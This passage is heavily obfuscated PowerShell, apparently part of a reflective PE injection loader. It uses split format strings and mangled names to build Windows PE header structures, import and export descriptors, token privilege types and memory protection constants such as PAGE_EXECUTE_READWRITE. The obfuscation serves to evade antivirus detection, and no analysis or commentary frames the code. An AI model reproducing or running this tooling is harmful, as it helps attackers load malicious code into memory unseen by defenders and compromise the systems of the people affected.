		    ${wiN32`Typ`es} | &("{1}{2}{0}" -f'r','Ad','d-Membe') -MemberType ("{0}{1}{2}" -f'N','o','teProperty') -Name ("{2}{1}{3}{0}"-f'RS64','NT_','IMAGE_','HEADE') -Value ${i`maGE_`NT_`H`EA`DERs64}
		
		    
		    ${AttRIb`Ut`eS} = ("{13}{4}{11}{14}{12}{7}{1}{8}{5}{6}{0}{2}{9}{10}{3}"-f'aled','ial',', Befo','dInit','utoLayout, An','yout',', Se','uent','La','reFie','l','s',', Class, Public, Seq','A','iClass')
		    ${T`YpEB`UiLd`eR} = ${m`od`UlebUI`l`deR}.("{2}{1}{0}" -f'e','Typ','Define').Invoke(("{0}{1}{4}{3}{2}" -f'IM','AGE_N','ADERS32','E','T_H'), ${AttRi`B`UTEs}, [System.ValueType], 248)
		    ${TypEbu`il`D`Er}.("{2}{0}{3}{1}"-f 'neF','d','Defi','iel').Invoke(("{1}{0}{2}" -f 'n','Sig','ature'), [UInt32], ("{0}{1}" -f 'Pub','lic')) | &("{0}{2}{1}" -f 'Out-','l','Nul')
		    ${T`y`pEBuIlDer}.("{0}{2}{1}" -f'D','neField','efi').Invoke(("{0}{2}{1}"-f'F','eader','ileH'), ${ImAG`E_`Fi`l`E_H`EaDER}, ("{0}{1}"-f'Pu','blic')) | &("{1}{0}{2}" -f '-Nul','Out','l')
		    ${Typ`e`BUiLD`ER}.("{2}{1}{0}{3}" -f'i','fineF','De','eld').Invoke(("{1}{3}{0}{2}{4}"-f'ion','Op','a','t','lHeader'), ${i`MAGE_opt`iOn`A`L_`HeaDEr32}, ("{1}{0}"-f 'c','Publi')) | &("{1}{0}{2}" -f 'ut-','O','Null')
		    ${image`_nt_hE`AdeRs`32} = ${t`YpE`BUI`LdER}.("{1}{2}{0}"-f 'e','Crea','teTyp').Invoke()
		    ${wIN3`2tyP`ES} | &("{2}{0}{1}"-f'mb','er','Add-Me') -MemberType ("{0}{1}{2}"-f 'NoteProp','e','rty') -Name ("{1}{3}{0}{4}{2}{5}" -f 'E','I','D','MAG','_NT_HEA','ERS32') -Value ${i`m`A`GE_`NT_head`Ers32}

		    
		    ${at`TRibU`T`Es} = ("{8}{11}{5}{2}{6}{4}{9}{7}{10}{12}{1}{3}{13}{0}"-f 't','Fiel','AnsiCl','d','s, Publi','ut, ','ass, Clas','lLayo','A','c, Sequentia','ut, Sealed','utoLayo',', Before','Ini')
		    ${TyP`EB`UI`LDER} = ${MODuL`e`BUIl`DEr}.("{2}{1}{3}{0}"-f 'pe','n','Defi','eTy').Invoke(("{1}{2}{3}{0}"-f 'DER','IMAGE','_DOS_','HEA'), ${a`TtRiBuT`eS}, [System.ValueType], 64)
		    ${TYpe`BUil`D`Er}.("{0}{1}{2}" -f'Defin','eFiel','d').Invoke(("{0}{2}{1}" -f 'e','ic','_mag'), [UInt16], ("{0}{1}"-f'Publi','c')) | &("{1}{0}" -f 'ull','Out-N')
		    ${tyP`Eb`UIlDER}.("{0}{2}{1}"-f'D','d','efineFiel').Invoke(("{1}{0}" -f'_cblp','e'), [UInt16], ("{1}{0}"-f'lic','Pub')) | &("{1}{0}{2}" -f 'Nul','Out-','l')
		    ${tYpE`BU`Ild`eR}.("{2}{1}{0}{3}"-f'e','Fi','Define','ld').Invoke(("{1}{0}" -f'_cp','e'), [UInt16], ("{0}{2}{1}" -f'Pu','lic','b')) | &("{2}{0}{1}"-f'u','t-Null','O')
		    ${t`Y`pEBuIL`der}.("{0}{3}{1}{2}" -f'Def','eFiel','d','in').Invoke(("{1}{0}{2}"-f 'c','e_','rlc'), [UInt16], ("{1}{0}" -f 'ublic','P')) | &("{2}{1}{0}"-f 'l','Nul','Out-')
		    ${tYpeb`U`IL`deR}.("{2}{1}{0}"-f'ld','eFie','Defin').Invoke(("{0}{1}" -f 'e','_cparhdr'), [UInt16], ("{1}{0}" -f'lic','Pub')) | &("{1}{0}"-f 'll','Out-Nu')
		    ${tYPeBuIl`D`eR}.("{1}{2}{0}" -f 'd','Define','Fiel').Invoke(("{1}{2}{3}{0}"-f 'oc','e_','m','inall'), [UInt16], ("{0}{1}"-f'Pub','lic')) | &("{1}{0}"-f 'ut-Null','O')
		    ${tY`P`EbUILd`er}.("{2}{1}{0}"-f 'd','l','DefineFie').Invoke(("{3}{2}{0}{1}"-f'l','oc','maxal','e_'), [UInt16], ("{0}{1}"-f'Pu','blic')) | &("{0}{2}{1}" -f'Out-','ll','Nu')
		    ${Type`B`UI`LDer}.("{0}{2}{1}" -f 'De','ld','fineFie').Invoke(("{1}{0}"-f'_ss','e'), [UInt16], ("{1}{0}" -f'blic','Pu')) | &("{2}{0}{1}" -f 't-','Null','Ou')
		    ${tY`PEB`Ui`lDER}.("{0}{2}{1}" -f'D','ineField','ef').Invoke(("{0}{1}" -f 'e_s','p'), [UInt16], ("{1}{0}{2}"-f 'i','Publ','c')) | &("{0}{1}" -f'Out-','Null')
		    ${Ty`peBuiLd`er}.("{1}{3}{2}{0}" -f'd','Defin','iel','eF').Invoke(("{1}{0}" -f 'um','e_cs'), [UInt16], ("{0}{1}"-f'Pu','blic')) | &("{2}{0}{1}"-f'u','ll','Out-N')
		    ${tY`pEbuIlD`er}.("{0}{2}{1}"-f 'D','ield','efineF').Invoke(("{0}{1}"-f'e_i','p'), [UInt16], ("{1}{0}" -f'ic','Publ')) | &("{2}{0}{1}"-f'ut','-Null','O')
		    ${t`yPEBUil`der}.("{3}{2}{1}{0}"-f 'ld','Fie','e','Defin').Invoke(("{0}{1}" -f'e','_cs'), [UInt16], ("{0}{1}"-f 'Publ','ic')) | &("{1}{2}{0}"-f'l','Out-N','ul')
		    ${T`YpeBu`ILder}.("{1}{2}{0}"-f'ld','Defin','eFie').Invoke(("{2}{1}{0}"-f'rlc','_lfa','e'), [UInt16], ("{0}{1}" -f'Publi','c')) | &("{2}{0}{1}"-f 'ut-','Null','O')
		    ${Ty`p`EBUil`der}.("{2}{0}{3}{1}" -f 'efine','eld','D','Fi').Invoke(("{1}{0}"-f 'o','e_ovn'), [UInt16], ("{1}{0}" -f 'c','Publi')) | &("{2}{1}{0}"-f'ull','ut-N','O')

		    ${e_R`ESFIe`LD} = ${tyPeb`UIl`DEr}.("{0}{1}{3}{2}"-f'D','e','ld','fineFie').Invoke(("{0}{1}"-f 'e_','res'), [UInt16[]], ("{4}{3}{1}{2}{0}" -f 'sFieldMarshal','c, H','a','li','Pub'))
		    ${c`O`NstRU`ctOrV`A`lUE} =  ${M`w`6zB}::"bYV`A`lArr`AY"
		    ${fiel`DaR`Ray} = @( (  &("{0}{1}"-f 'itE','m') ("v"+"ARi"+"abLE:k"+"iDBr"))."vA`luE".("{1}{0}{2}" -f 'tFiel','Ge','d').Invoke(("{2}{0}{1}"-f'n','st','SizeCo')))
		    ${at`T`RibB`U`iLDeR} = &("{3}{2}{0}{1}"-f'e','ct','ew-Obj','N') ("{8}{3}{10}{2}{4}{6}{5}{1}{0}{7}{9}"-f 'uild','B','tr','ction.Emit.CustomA','i','e','but','e','System.Refle','r','t')(${C`O`N`STRUcTOriN`FO}, ${CO`NSTrUCTo`Rv`A`l`Ue}, ${f`iElDa`R`RAY}, @([Int32] 4))
		    ${e`_rES`FieLd}.("{2}{1}{0}{4}{3}"-f 'Cust','t','Se','mAttribute','o').Invoke(${A`TTRIbb`UILD`er})

		    ${TY`pEBuiL`dER}.("{2}{1}{0}" -f 'Field','fine','De').Invoke(("{1}{0}"-f'oemid','e_'), [UInt16], ("{2}{1}{0}" -f'c','i','Publ')) | &("{0}{2}{1}"-f 'O','l','ut-Nul')
		    ${tyPE`Bu`ILD`er}.("{1}{2}{0}" -f'd','D','efineFiel').Invoke(("{1}{2}{0}"-f 'o','e_oemi','nf'), [UInt16], ("{2}{0}{1}" -f 'l','ic','Pub')) | &("{2}{1}{0}"-f 'Null','-','Out')

		    ${e`_ReS`2fIeLd} = ${TY`pEB`UI`LdEr}.("{1}{0}{2}"-f'efineF','D','ield').Invoke(("{0}{2}{1}"-f'e_','2','res'), [UInt16[]], ("{4}{3}{2}{6}{1}{0}{5}"-f'rsha','eldMa',' H','blic,','Pu','l','asFi'))
		    ${C`oNStrU`cT`OrV`ALuE} =   (&("{0}{1}"-f'd','ir') ('vA'+'RIA'+'B'+'Le:MW'+'6ZB')  )."VA`Lue"::"BYv`ALA`RrAy"
		    ${attR`ibbuIlD`ER} = &("{1}{0}{2}" -f 'w-O','Ne','bject') ("{1}{8}{9}{2}{6}{3}{5}{4}{7}{0}" -f'Builder','System','m','st','Attr','om','it.Cu','ibute','.Reflection.','E')(${CO`NSt`R`Uct`oRinFo}, ${cOn`sT`RUctoRVAL`UE}, ${FIE`ldAR`RAY}, @([Int32] 10))
		    ${E_rE`s2`F`IELD}.("{2}{3}{1}{0}" -f 'ibute','omAttr','Set','Cust').Invoke(${AttR`ibBUi`L`der})

		    ${tYPEBU`I`ld`ER}.("{3}{2}{0}{1}" -f'eF','ield','n','Defi').Invoke(("{1}{2}{0}"-f'w','e_lfan','e'), [Int32], ("{0}{1}"-f'Publ','ic')) | &("{1}{0}"-f'll','Out-Nu')
		    ${Im`AgE_`DOs`_`hEAdeR} = ${TyPe`BUIl`DeR}.("{2}{1}{0}"-f 'teType','ea','Cr').Invoke()	
		    ${wi`N32`TYPeS} | &("{3}{2}{0}{1}" -f 'be','r','m','Add-Me') -MemberType ("{2}{1}{0}{3}" -f'r','tePrope','No','ty') -Name ("{1}{0}{2}" -f'_HEADE','IMAGE_DOS','R') -Value ${IM`Age_dO`s_hE`ADeR}

		    
		    ${ATTRI`Bu`TeS} = ("{3}{0}{10}{14}{16}{15}{20}{18}{7}{8}{1}{9}{11}{19}{17}{13}{2}{6}{5}{12}{4}" -f 'utoLayout','c, ',', Se','A','reFieldInit','led, ','a','b','li','Sequenti',', A','a','Befo','yout','n','Cl','siClass, ','La','u','l','ass, P')
		    ${tYpe`B`Uild`Er} = ${MOdule`BU`IlDeR}.("{2}{0}{3}{1}"-f 'efi','pe','D','neTy').Invoke(("{4}{3}{2}{0}{1}{5}"-f 'SE','CTION','GE_','MA','I','_HEADER'), ${aT`T`RIbUtes}, [System.ValueType], 40)

		    ${NA`Me`FieLD} = ${t`yPe`BUILDEr}.("{1}{2}{3}{0}" -f'eld','Defi','n','eFi').Invoke(("{1}{0}" -f 'me','Na'), [Char[]], ("{2}{3}{1}{4}{0}{5}" -f'dMarsha','c, HasFie','Pu','bli','l','l'))
		    ${cO`NStrUCtOR`VA`lUE} =   ( &("{2}{4}{1}{0}{3}"-f'Ldi','chi','geT','TeM','-')  ("Va"+"RiaBlE:Mw"+"6"+"zB"))."VaL`Ue"::"byVAl`Arr`Ay"
		    ${a`TTriBBu`i`l`DER} = &("{2}{0}{1}" -f '-','Object','New') ("{9}{1}{4}{2}{0}{7}{8}{3}{6}{5}" -f'ustomAtt','tem.','lection.Emit.C','u','Ref','er','ild','ribute','B','Sys')(${coNstru`c`TORInFO}, ${Co`NStRU`ctorvaL`Ue}, ${FIeldA`R`RAy}, @([Int32] 8))
		    ${nA`mE`F`IELD}.("{3}{2}{0}{1}" -f 'stomA','ttribute','etCu','S').Invoke(${aTtRiBbU`il`dER})

		    ${TY`PEb`UiL`Der}.("{0}{3}{1}{2}"-f'D','Fiel','d','efine').Invoke(("{2}{0}{3}{1}" -f 'irtual','ze','V','Si'), [UInt32], ("{0}{1}"-f'Pu','blic')) | &("{1}{0}"-f'l','Out-Nul')
		    ${tyPeBU`i`ldeR}.("{0}{2}{3}{1}" -f 'De','neField','f','i').Invoke(("{3}{2}{0}{1}" -f'dd','ress','lA','Virtua'), [UInt32], ("{0}{1}"-f 'Publi','c')) | &("{1}{0}"-f'l','Out-Nul')
		    ${Ty`pe`B`UIldEr}.("{1}{2}{0}{3}"-f'n','Def','i','eField').Invoke(("{1}{3}{2}{0}"-f 'awData','S','eOfR','iz'), [UInt32], ("{0}{1}{2}"-f 'Publ','i','c')) | &("{2}{1}{0}"-f'ull','-N','Out')
		    ${T`Y`PEbuil`deR}.("{1}{0}{2}"-f 'ineFie','Def','ld').Invoke(("{2}{4}{0}{3}{1}"-f 'erTo','Data','P','Raw','oint'), [UInt32], ("{0}{2}{1}" -f 'Pub','ic','l')) | &("{0}{2}{1}"-f'O','Null','ut-')
		    ${TyP`ebu`Il`DeR}.("{0}{1}{2}" -f'Def','ineFiel','d').Invoke(("{2}{3}{0}{1}"-f 'terTo','Relocations','Poi','n'), [UInt32], ("{0}{1}"-f'Pu','blic')) | &("{0}{1}{2}"-f 'Out-','N','ull')
		    ${TyPEb`Uil`d`eR}.("{0}{1}{2}"-f'Defi','neFi','eld').Invoke(("{1}{2}{0}{3}"-f 'mb','Pointer','ToLinenu','ers'), [UInt32], ("{1}{0}"-f'blic','Pu')) | &("{0}{1}{2}" -f 'Out-','Nu','ll')
		    ${tYpEBui`LD`Er}.("{1}{3}{0}{2}" -f 'l','D','d','efineFie').Invoke(("{2}{0}{3}{1}"-f 'Rel','ons','NumberOf','ocati'), [UInt16], ("{0}{1}"-f 'P','ublic')) | &("{0}{1}"-f'Out-Nul','l')
		    ${t`YP`Eb`UiLdeR}.("{0}{2}{1}{3}"-f'D','Fi','efine','eld').Invoke(("{3}{4}{2}{1}{0}" -f 'ers','enumb','in','N','umberOfL'), [UInt16], ("{0}{1}" -f 'P','ublic')) | &("{0}{2}{1}" -f 'O','ll','ut-Nu')
		    ${tY`pEBuI`l`DER}.("{1}{2}{0}"-f 'd','Defi','neFiel').Invoke(("{3}{0}{2}{1}" -f 'ar','ics','acterist','Ch'), [UInt32], ("{1}{0}"-f'ublic','P')) | &("{1}{0}"-f 'Null','Out-')
		    ${IMag`e_s`eCTi`On`_`hEA`DeR} = ${TY`pe`BUIldER}.("{0}{2}{1}"-f'Creat','ype','eT').Invoke()
		    ${wI`N3`2T`ypes} | &("{0}{2}{1}"-f 'Add','ember','-M') -MemberType ("{0}{1}{2}"-f 'N','ote','Property') -Name ("{1}{2}{3}{0}{4}" -f'I','IMAG','E_','SECT','ON_HEADER') -Value ${i`MA`ge_`S`eCT`IoN_hEADEr}

		    
		    ${A`T`Tri`ButeS} = ("{7}{5}{15}{14}{12}{9}{8}{18}{17}{6}{16}{11}{13}{0}{10}{1}{2}{4}{3}"-f 'ale',' Be','foreFi','t','eldIni','y','SequentialLayo','AutoLa','s, Publi','ss, Clas','d,','t,','iCla',' Se','s','out, An','u',' ','c,')
		    ${TY`PEbui`LD`er} = ${MoDu`lebu`i`LDer}.("{2}{0}{1}" -f'ineTyp','e','Def').Invoke(("{3}{0}{4}{1}{2}" -f'M','_REL','OCATION','I','AGE_BASE'), ${a`T`TR`ibuteS}, [System.ValueType], 8)
		    ${t`ypebu`iLDEr}.("{1}{2}{0}{3}" -f 'fine','D','e','Field').Invoke(("{1}{4}{3}{0}{2}" -f're','V','ss','ualAdd','irt'), [UInt32], ("{0}{2}{1}"-f'Pu','c','bli')) | &("{2}{0}{1}"-f't-Nul','l','Ou')
		    ${TYp`ebUiL`D`er}.("{0}{2}{1}{3}" -f'D','n','efi','eField').Invoke(("{3}{1}{2}{0}" -f 'lock','zeOf','B','Si'), [UInt32], ("{1}{0}" -f 'lic','Pub')) | &("{2}{1}{0}" -f 'll','u','Out-N')
		    ${ima`ge_ba`sE_`RElO`ca`Tion} = ${T`Yp`EbU`iLdER}.("{2}{0}{3}{1}" -f'e','pe','Cr','ateTy').Invoke()
		    ${Wi`N32`TYP`Es} | &("{2}{0}{1}"-f 'be','r','Add-Mem') -MemberType ("{2}{1}{0}"-f 'perty','ePro','Not') -Name ("{1}{3}{2}{4}{0}" -f'N','IMAGE_BASE','RELOCATI','_','O') -Value ${iMage_bAS`E`_rEl`Oc`A`TIoN}

		    
		    ${At`Tr`IBUT`es} = ("{6}{4}{11}{0}{3}{5}{1}{8}{10}{7}{12}{2}{9}"-f ', Pu','Seque','Ini','bli','ayout, AnsiClass, Cla','c, ','AutoL',', ','ntialL','t','ayout, Sealed','ss','BeforeField')
		    ${TyPE`BUI`Ld`er} = ${modu`leB`UI`LDer}.("{2}{0}{1}" -f'ineTy','pe','Def').Invoke(("{3}{2}{1}{4}{0}"-f 'RIPTOR','DES','MAGE_IMPORT_','I','C'), ${aTT`R`ib`UTES}, [System.ValueType], 20)
		    ${tyPE`BuI`Ld`Er}.("{2}{1}{0}"-f'neField','efi','D').Invoke(("{3}{0}{1}{2}"-f 't','e','ristics','Charac'), [UInt32], ("{1}{0}"-f'lic','Pub')) | &("{1}{2}{0}" -f 'll','Ou','t-Nu')
		    ${TyPeb`U`I`LdER}.("{0}{2}{1}"-f'D','eld','efineFi').Invoke(("{2}{3}{1}{0}"-f'tamp','ateS','Tim','eD'), [UInt32], ("{0}{1}"-f'P','ublic')) | &("{2}{0}{1}" -f '-Nu','ll','Out')
		    ${T`YP`eBU`Ilder}.("{2}{1}{0}"-f'Field','ne','Defi').Invoke(("{2}{0}{1}" -f'd','erChain','Forwar'), [UInt32], ("{0}{2}{1}"-f 'P','ic','ubl')) | &("{0}{1}" -f 'Out-Nu','ll')
		    ${T`yPebuIlD`er}.("{0}{3}{1}{2}"-f'Defin','Fiel','d','e').Invoke(("{1}{0}" -f'ame','N'), [UInt32], ("{1}{2}{0}" -f 'lic','P','ub')) | &("{2}{1}{0}" -f 'll','Nu','Out-')
		    ${TYp`Ebui`lDEr}.("{2}{0}{1}" -f'efineFie','ld','D').Invoke(("{2}{1}{0}" -f 'hunk','tT','Firs'), [UInt32], ("{2}{1}{0}"-f'c','ubli','P')) | &("{1}{2}{0}" -f 'ull','Out','-N')
		    ${IMA`Ge_`IMPoR`T`_D`EscR`iP`TOr} = ${ty`pEB`U`iLDEr}.("{2}{1}{0}"-f 'pe','eTy','Creat').Invoke()
		    ${W`In32`TyPeS} | &("{3}{0}{2}{1}"-f'dd-Me','er','mb','A') -MemberType ("{0}{3}{1}{2}"-f 'NotePr','per','ty','o') -Name ("{5}{1}{4}{2}{0}{3}"-f 'PO','G','IM','RT_DESCRIPTOR','E_','IMA') -Value ${iM`AGe`_i`MPOr`T_dESC`RiPTOR}

		    
		    ${atT`Ri`Butes} = ("{11}{2}{6}{8}{1}{4}{7}{0}{13}{12}{5}{3}{9}{10}" -f'quentia','Publ','out, Ans','ef','ic,','ed, B','iClass, Clas',' Se','s, ','ore','FieldInit','AutoLay','ayout, Seal','lL')
		    ${tYpe`BU`il`DEr} = ${Mo`DUle`BUI`ld`eR}.("{1}{2}{0}"-f 'neType','Def','i').Invoke(("{6}{5}{2}{1}{3}{4}{0}"-f 'TORY','I','D','R','EC','_','IMAGE_EXPORT'), ${AtT`R`iBUt`es}, [System.ValueType], 40)
		    ${T`YPEbU`IL`der}.("{3}{1}{0}{2}" -f'ie','efineF','ld','D').Invoke(("{1}{2}{3}{4}{0}"-f'istics','Ch','a','r','acter'), [UInt32], ("{1}{0}"-f'lic','Pub')) | &("{0}{1}" -f 'Out-N','ull')
		    ${typ`e`BUILd`Er}.("{0}{2}{3}{1}" -f'Def','eld','i','neFi').Invoke(("{1}{0}{2}" -f'eStam','TimeDat','p'), [UInt32], ("{1}{0}"-f'ublic','P')) | &("{0}{2}{1}"-f'O','-Null','ut')
		    ${ty`pe`BUil`deR}.("{0}{1}{2}" -f'Define','F','ield').Invoke(("{0}{3}{2}{1}" -f'Maj','on','rVersi','o'), [UInt16], ("{1}{0}" -f 'ublic','P')) | &("{1}{0}"-f 'ull','Out-N')
		    ${t`y`PeBUi`LDEr}.("{0}{2}{1}" -f'Def','Field','ine').Invoke(("{2}{3}{1}{0}" -f'sion','Ver','Mino','r'), [UInt16], ("{0}{1}{2}" -f'P','ubli','c')) | &("{1}{0}" -f 'l','Out-Nul')
		    ${t`ypebu`i`lDEr}.("{2}{0}{1}"-f 'neFiel','d','Defi').Invoke(("{0}{1}"-f 'Nam','e'), [UInt32], ("{1}{0}{2}"-f 'bl','Pu','ic')) | &("{0}{1}{2}"-f'Out','-Nu','ll')
		    ${TYp`eBu`iL`der}.("{1}{2}{0}" -f'eld','Defin','eFi').Invoke(("{0}{1}" -f 'Bas','e'), [UInt32], ("{2}{0}{1}"-f'i','c','Publ')) | &("{0}{1}{2}"-f 'Out-Nu','l','l')
		    ${T`yPebUi`ld`ER}.("{0}{1}{2}"-f 'Defin','eFiel','d').Invoke(("{1}{3}{2}{0}" -f's','Nu','on','mberOfFuncti'), [UInt32], ("{0}{1}" -f 'P','ublic')) | &("{0}{2}{1}" -f 'Ou','ull','t-N')
		    ${TYPEb`UI`Ld`eR}.("{1}{2}{0}"-f'Field','D','efine').Invoke(("{1}{0}{2}" -f'e','Numb','rOfNames'), [UInt32], ("{0}{1}" -f'Pub','lic')) | &("{1}{0}{2}"-f 'ut-Nul','O','l')
		    ${tYpeB`UiL`DER}.("{1}{2}{0}" -f'eld','DefineF','i').Invoke(("{0}{3}{1}{2}{4}" -f 'A','u','ncti','ddressOfF','ons'), [UInt32], ("{1}{0}"-f'ic','Publ')) | &("{0}{1}" -f'O','ut-Null')
		    ${tYP`EB`Ui`LdeR}.("{3}{0}{2}{1}"-f 'fi','ld','neFie','De').Invoke(("{1}{3}{4}{2}{0}" -f 'fNames','Addr','O','es','s'), [UInt32], ("{1}{0}"-f'blic','Pu')) | &("{2}{0}{1}"-f'-','Null','Out')
		    ${tYp`EbUILd`eR}.("{0}{1}{2}{3}" -f'D','efineF','ie','ld').Invoke(("{1}{2}{3}{0}{5}{4}" -f'Nam','A','d','dressOf','Ordinals','e'), [UInt32], ("{1}{0}"-f 'ic','Publ')) | &("{1}{2}{0}"-f 'll','Out-','Nu')
		    ${iMag`e`_exporT_DiR`e`cTORy} = ${t`YPeBu`iLDeR}.("{0}{2}{1}" -f 'C','ateType','re').Invoke()
		    ${Win32T`Y`P`es} | &("{1}{0}{2}"-f 'dd-','A','Member') -MemberType ("{2}{3}{1}{0}" -f 'ty','roper','Not','eP') -Name ("{0}{1}{4}{5}{3}{2}" -f'IMAGE_E','XPO','RECTORY','I','R','T_D') -Value ${iMaGE`_`E`XPO`R`T_`Di`REctORY}
		
		    
		    ${A`TTRIbu`TEs} = ("{5}{1}{10}{8}{11}{3}{4}{14}{13}{17}{16}{9}{6}{0}{12}{7}{15}{2}" -f't,','toLayou','it','Cla','ss, Cl','Au','Layou','d, BeforeFi',', A','quential','t','nsi',' Seale','Pu','ass, ','eldIn','c, Se','bli')
		    ${t`YPEB`UIl`DEr} = ${Mo`dUl`eb`U`iLDer}.("{2}{1}{0}" -f'ype','ineT','Def').Invoke(("{1}{0}"-f'UID','L'), ${A`Tt`RiBu`TeS}, [System.ValueType], 8)
		    ${Ty`pebUi`ldER}.("{2}{1}{0}" -f'Field','fine','De').Invoke(("{1}{0}"-f'art','LowP'), [UInt32], ("{1}{0}"-f'ic','Publ')) | &("{1}{0}{2}" -f'ut-N','O','ull')
		    ${T`yP`ebUi`LDeR}.("{0}{2}{1}"-f'DefineF','d','iel').Invoke(("{1}{2}{0}" -f 'rt','Hi','ghPa'), [UInt32], ("{0}{1}"-f 'Publ','ic')) | &("{1}{0}"-f'-Null','Out')
		    ${lU`iD} = ${T`yPeB`Ui`ldEr}.("{1}{2}{0}"-f 'pe','Cre','ateTy').Invoke()
		    ${WIN`3`2t`ypES} | &("{0}{2}{1}"-f'Add-M','mber','e') -MemberType ("{0}{1}{2}" -f 'No','tePropert','y') -Name ("{1}{0}"-f 'UID','L') -Value ${L`UID}
		
		    
		    ${atTR`iB`UtES} = ("{1}{11}{9}{6}{14}{2}{8}{15}{4}{13}{7}{17}{3}{16}{12}{18}{5}{0}{10}"-f'eld','A','t, ','lLayout,',', ','Fi','ay','lic, ','AnsiClass, C','oL','Init','ut','ealed, Bef','Pub','ou','lass',' S','Sequentia','ore')
		    ${TY`PebU`il`der} = ${MODUl`e`B`UIl`dER}.("{2}{1}{0}" -f 'e','fineTyp','De').Invoke(("{5}{4}{0}{2}{6}{3}{1}"-f'_A','ES','ND','TRIBUT','UID','L','_AT'), ${A`TTrIB`U`Tes}, [System.ValueType], 12)
		    ${TY`pE`BuIl`der}.("{2}{0}{1}"-f'ineF','ield','Def').Invoke(("{0}{1}" -f 'L','uid'), ${L`UID}, ("{2}{0}{1}"-f 'ub','lic','P')) | &("{2}{0}{1}"-f 'u','ll','Out-N')
		    ${TYp`EBuiLD`ER}.("{1}{0}{2}"-f 'ineFie','Def','ld').Invoke(("{1}{0}{2}{3}" -f 'r','Att','ib','utes'), [UInt32], ("{0}{1}" -f'Pub','lic')) | &("{0}{1}{2}" -f 'Out-N','ul','l')
		    ${L`Ui`D_ANd_aTT`RI`B`U`TEs} = ${TyP`Ebuil`D`eR}.("{1}{0}{2}"-f'reateTyp','C','e').Invoke()
		    ${W`I`N32Types} | &("{1}{2}{0}"-f'r','Add','-Membe') -MemberType ("{1}{0}{3}{2}" -f 'Prop','Note','y','ert') -Name ("{2}{4}{3}{0}{5}{1}"-f'_','TTRIBUTES','L','ID_AND','U','A') -Value ${LUid_AN`D_`A`TTRIbU`T`es}
		
		    
		    ${a`T`TrIBuTes} = ("{12}{10}{1}{16}{13}{20}{15}{14}{11}{7}{0}{4}{9}{18}{5}{8}{2}{17}{6}{3}{19}"-f ' Se','you','ale','foreField','que','ay',', Be','ublic,','out, Se','ntia','oLa','P','Aut','las','s, ','las','t, AnsiC','d','lL','Init','s, C')
		    ${Ty`Peb`Uil`dER} = ${MODULEBUi`l`deR}.("{2}{1}{0}"-f'e','p','DefineTy').Invoke(("{0}{1}{2}"-f'T','OKEN_PRIV','ILEGES'), ${aTT`Ri`But`eS}, [System.ValueType], 16)
		    ${ty`peBu`iL`dEr}.("{2}{1}{0}"-f'ield','fineF','De').Invoke(("{2}{1}{3}{0}"-f't','egeCo','Privil','un'), [UInt32], ("{1}{0}{2}" -f'ub','P','lic')) | &("{0}{2}{1}"-f 'O','ull','ut-N')
		    ${TYPE`BUIld`Er}.("{0}{1}{2}"-f 'De','fineFiel','d').Invoke(("{1}{0}{2}"-f 'i','Pr','vileges'), ${luId`_aN`d_at`TR`IbUtES}, ("{1}{0}"-f'lic','Pub')) | &("{2}{1}{0}"-f'l','-Nul','Out')
		    ${to`KE`N_pRI`VIl`eGES} = ${tYP`EbU`I`lDEr}.("{3}{1}{0}{2}" -f 'Ty','eate','pe','Cr').Invoke()
		    ${wIn`32Ty`peS} | &("{1}{3}{0}{2}" -f 'b','Add-Me','er','m') -MemberType ("{3}{2}{1}{0}" -f 'erty','op','otePr','N') -Name ("{2}{4}{1}{0}{3}" -f'IVIL','R','TOKEN_','EGES','P') -Value ${t`OK`e`N_pRI`VIleGES}

		    return ${WIn3`2tYp`es}
	    }

	    Function GEt-WiN32`cO`N`S`TAntS
	    {
		    ${W`In32C`onsTA`NTs} = &("{0}{1}{2}"-f 'N','e','w-Object') ("{2}{1}{0}" -f'tem.Object','s','Sy')
		
		    ${wI`N3`2cOnSt`AN`TS} | &("{0}{1}{2}" -f 'A','d','d-Member') -MemberType ("{2}{0}{1}{3}" -f 'o','per','NotePr','ty') -Name ("{2}{1}{0}{3}"-f 'COMM','M_','ME','IT') -Value 0x00001000
		    ${WIn3`2Co`NSTAn`TS} | &("{0}{1}{2}" -f'Add','-Mem','ber') -MemberType ("{2}{0}{1}" -f 'tePropert','y','No') -Name ("{2}{1}{0}" -f 'ESERVE','EM_R','M') -Value 0x00002000
		    ${wIn`32`CoN`sTA`Nts} | &("{0}{2}{1}"-f 'Add','r','-Membe') -MemberType ("{2}{0}{1}" -f 'otePro','perty','N') -Name ("{2}{4}{0}{3}{1}"-f'C','ESS','PAGE_NO','C','A') -Value 0x01
		    ${win32c`oNST`AnTs} | &("{1}{2}{0}"-f'er','Add-Me','mb') -MemberType ("{1}{0}{2}"-f'rt','NotePrope','y') -Name ("{4}{1}{0}{2}{3}"-f'GE_RE','A','ADO','NLY','P') -Value 0x02
		    ${w`in32`c`onSTAnts} | &("{2}{0}{1}" -f 'dd-Memb','er','A') -MemberType ("{1}{2}{0}{3}" -f'er','NotePro','p','ty') -Name ("{3}{1}{2}{0}"-f'ITE','GE','_READWR','PA') -Value 0x04
		    ${wiN`32C`ON`st`ANts} | &("{1}{0}{2}"-f 'mb','Add-Me','er') -MemberType ("{2}{0}{1}" -f 'rop','erty','NoteP') -Name ("{0}{1}{2}"-f'PA','GE_WRI','TECOPY') -Value 0x08
		    ${Win`32`CONSt`ANtS} | &("{1}{2}{0}" -f 'er','Add','-Memb') -MemberType ("{3}{1}{2}{0}"-f 'ty','ro','per','NoteP') -Name ("{1}{3}{0}{2}" -f'CU','PAGE','TE','_EXE') -Value 0x10
		    ${WI`N32cONS`T`AnTs} | &("{1}{3}{0}{2}"-f'Me','A','mber','dd-') -MemberType ("{0}{3}{2}{1}" -f'Note','ty','oper','Pr') -Name ("{1}{4}{3}{5}{0}{2}"-f 'E','PA','_READ','_EXEC','GE','UT') -Value 0x20
		    ${wIn32COn`s`T`AnTS} | &("{1}{0}{2}" -f '-Me','Add','mber') -MemberType ("{1}{2}{3}{0}"-f 'y','N','ote','Propert') -Name ("{2}{3}{0}{5}{4}{1}" -f 'ECUTE_RE','ITE','PAGE','_EX','WR','AD') -Value 0x40
		    ${w`i`N`32Co`NsTAntS} | &("{0}{2}{1}"-f'Add-M','mber','e') -MemberType ("{3}{2}{1}{0}" -f 'rty','Prope','e','Not') -Name ("{2}{1}{5}{0}{6}{3}{4}" -f 'XECUT','G','PA','RI','TECOPY','E_E','E_W') -Value 0x80
		    ${WiN3`2Co`N`sTAnts} | &("{2}{1}{0}"-f 'r','embe','Add-M') -MemberType ("{2}{3}{1}{0}"-f'ty','r','N','otePrope') -Name ("{1}{3}{2}{0}" -f 'E','PA','E_NOCACH','G') -Value 0x200
